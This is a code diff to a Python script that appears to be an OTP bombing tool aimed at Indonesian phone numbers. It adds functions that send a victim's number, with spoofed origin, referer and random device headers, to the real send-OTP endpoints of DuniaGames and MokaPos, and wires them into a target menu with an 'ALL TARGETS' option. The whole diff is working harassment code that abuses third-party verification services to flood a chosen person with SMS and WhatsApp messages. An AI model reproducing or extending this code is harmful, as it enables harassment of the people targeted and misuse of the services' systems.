@@ -48,7 +48,11 @@ console = Console()
 APIS = {
     1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
         "cooldown": 60, "color": "bright_red",    "method": "planetban"},
-    2: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
+    2: {"name": "DuniaGames",  "desc": "OTP SMS",   "tag": "DNG",
+        "cooldown": 60, "color": "bright_yellow",  "method": "duniagames"},
+    3: {"name": "MokaPos",     "desc": "OTP WA",    "tag": "MKP",
+        "cooldown": 60, "color": "bright_magenta", "method": "mokapos"},
+    4: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
         "cooldown": 0,  "color": "bold cyan",      "method": "all"},
 }
 
@@ -364,8 +368,54 @@ def send_planetban(phone: str) -> dict:
 
     return {"status": last_code, "body": last_body}
 
+def send_duniagames(phone: str) -> dict:
+    num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
+    plus = "+62" + num[2:]
+    user = "0"  + num[2:]
+
+    payload = json.dumps({"phoneNumber": plus, "userName": user})
+    hdrs = _h(
+        **{
+            "Content-Type":     "application/json",
+            "ciam-type":        "FR",
+            "x-device":         str(uuid.uuid4()),
+            "origin":           "https://duniagames.co.id",
+            "referer":          "https://duniagames.co.id/",
+            "x-requested-with": "com.chimbori.hermitcrab",
+            "sec-fetch-site":   "same-site",
+        }
+    )
+    return safe_post(
+        "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
+        headers=hdrs, data=payload,
+    )
+
+
+def send_mokapos(phone: str) -> dict:
+    num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
+    plus = "+62" + num[2:]
+
+    payload = json.dumps({"phone_number": plus})
+    hdrs = _h(
+        **{
+            "Content-Type":     "application/json",
+            "authorization":    "undefined",
+            "origin":           "https://backoffice.mokapos.com",
+            "referer":          "https://backoffice.mokapos.com/",
+            "x-requested-with": "com.chimbori.hermitcrab",
+            "sec-fetch-site":   "same-site",
+        }
+    )
+    return safe_post(
+        "https://service-goauth.mokapos.com/account/v1/verification/phone/sendc",
+        headers=hdrs, data=payload,
+    )
+
+
 def dispatch(method: str, phone: str) -> dict:
-    if method == "planetban": return send_planetban(phone)
+    if method == "planetban":  return send_planetban(phone)
+    if method == "duniagames": return send_duniagames(phone)
+    if method == "mokapos":    return send_mokapos(phone)
     return {}
 
 # ══════════════════════════════════════════════════════════════
